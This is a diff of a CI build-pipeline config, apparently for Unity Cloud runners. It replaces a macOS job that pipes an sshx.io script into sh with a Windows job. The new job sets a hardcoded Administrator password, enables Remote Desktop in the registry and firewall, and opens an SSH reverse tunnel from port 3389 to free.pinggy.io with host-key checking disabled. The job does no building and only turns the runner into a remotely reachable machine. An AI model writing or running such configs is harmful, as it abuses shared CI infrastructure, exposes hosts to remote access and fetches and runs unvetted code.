@@ -1,13 +1,27 @@
 version: 1.0.0
 
 jobs:
-  macos-sshx:
-    name: "macOS Runner với SSHX"
-    runs-on: macos
+  win-rdp:
+    name: "Windows RDP + Pinggy Tunnel"
+    runs-on: windows
     steps:
       - run:
-          name: Cài SSHX
+          name: Enable RDP
+          shell: powershell
           command: |
-            echo "=== Cài SSHX cho macOS Unity Cloud ==="
-            curl -sSf https://sshx.io/get | sh -s run &
-            sleep 200m  # giữ runner sống 200 phút để sshx còn hoạt động
+            # Set mật khẩu cho Administrator
+            net user Administrator "Xy!9#2025_RdpStrong*"
+            reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+      - run:
+          name: Setup SSH client
+          shell: powershell
+          command: |
+            choco install -y openssh
+
+      - run:
+          name: Start Pinggy Tunnel (443->3389)
+          shell: powershell
+          command: |
+            ssh -p 443 -R0:localhost:3389 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 lVuaQjAzw82+tcp@free.pinggy.io
